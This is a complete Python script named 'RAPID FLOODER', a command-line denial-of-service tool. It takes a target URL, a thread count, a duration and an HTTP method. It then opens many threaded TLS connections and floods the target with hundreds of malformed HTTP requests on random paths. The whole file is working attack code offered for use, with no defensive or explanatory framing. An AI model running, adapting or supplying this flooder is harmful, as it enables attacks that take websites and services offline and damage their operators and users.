import socket,ssl,threading,struct
from MODEL.data import generate_url_path,get_target

def RAPID_SENDER(byt,byt2,ssl_socket):
    try:
        for _ in range(500):
            ssl_socket.write(byt2); ssl_socket.send(byt2); ssl_socket.sendall(byt2)
            ssl_socket.write(byt); ssl_socket.send(byt); ssl_socket.sendall(byt)
            ssl_socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1))
    except:pass

def RAPID(target,duration_sec_attack_dude, byt, byt2):
    for _ in range(int(duration_sec_attack_dude)):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((str(target['host']),int(target['port'])))
            s.connect_ex((str(target['host']),int(target['port'])))
            try:ssl_socket = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2).wrap_socket(s,server_hostname=target['host'])
            except:ssl_socket  = ssl.SSLContext().wrap_socket(s,server_hostname=target['host'])
            threading.Thread(target=RAPID_SENDER,args=(byt,byt2,ssl_socket)).start()
        except Exception as e:pass

import sys
url = ''
METHODS = ''
time_booter = 0
thread_lower = 0
if len(sys.argv) == 5:
   url = sys.argv[1]
   thread_lower = int(sys.argv[2])
   time_booter = int(sys.argv[3])
   METHODS = sys.argv[4]
else:
 print(f'WELCOME TO RAPID FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHOD>')
target = get_target(url)
byt = f"{METHODS} {target['uri']} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
for _ in range(int(thread_lower)):
 for _ in range(15):url_path = generate_url_path(1); byt2 = f"{METHODS} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode(); threading.Thread(target=RAPID,args=(target,time_booter,byt, byt2)).start()
